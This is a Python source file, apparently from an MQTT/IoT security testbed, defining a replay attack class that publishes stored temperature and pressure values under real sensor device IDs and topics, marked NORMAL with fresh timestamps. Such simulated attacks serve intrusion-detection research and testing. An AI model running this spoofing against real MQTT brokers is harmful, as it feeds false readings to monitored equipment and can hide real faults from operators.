"""
Replay Attack

Purpose:
    Replays previously observed legitimate MQTT packets.
"""

import random
from datetime import datetime

from backend.attacks.attack_config import (
    REPLAY_ATTACK_CLIENT,
    REPLAY_PACKET_INTERVAL,
    REPLAY_ATTACK_DURATION,
)

from backend.attacks.attack_utils import choose_real_sensor
from backend.attacks.base_attack import BaseAttack


class ReplayAttack(BaseAttack):
    """MQTT Replay Attack."""

    def __init__(self):
        super().__init__(
            attack_name="Replay Attack",
            client_id=REPLAY_ATTACK_CLIENT,
            interval=REPLAY_PACKET_INTERVAL,
            duration=REPLAY_ATTACK_DURATION,
        )

        self.packet_count = 0

        # Previously captured legitimate values
        self.temperature_packets = [
            27.4, 27.8, 28.2, 28.6, 29.0,
            29.4, 29.8, 30.2
        ]

        self.pressure_packets = [
            100.5, 100.8, 101.1, 101.4,
            101.7, 102.0, 102.3
        ]

    def execute(self):
        """Replay a previously captured packet."""

        self.packet_count += 1

        sensor = choose_real_sensor()

        if sensor["sensor_type"] == "temperature":
            value = random.choice(self.temperature_packets)
        else:
            value = random.choice(self.pressure_packets)

        payload = {
            "device_id": sensor["device_id"],
            "timestamp": datetime.now().isoformat(),
            "sensor_type": sensor["sensor_type"],
            "value": value,
            "unit": sensor["unit"],
            "status": "NORMAL",
        }

        self.publisher.publish(
            sensor["topic"],
            payload,
        )

        self.logger.info(
            f"Replay Packet #{self.packet_count} | "
            f"{sensor['sensor_type']}={value} {sensor['unit']} "
            f"→ {sensor['topic']}"
        )


if __name__ == "__main__":
    attack = ReplayAttack()

    try:
        attack.start()

    except KeyboardInterrupt:
        attack.stop()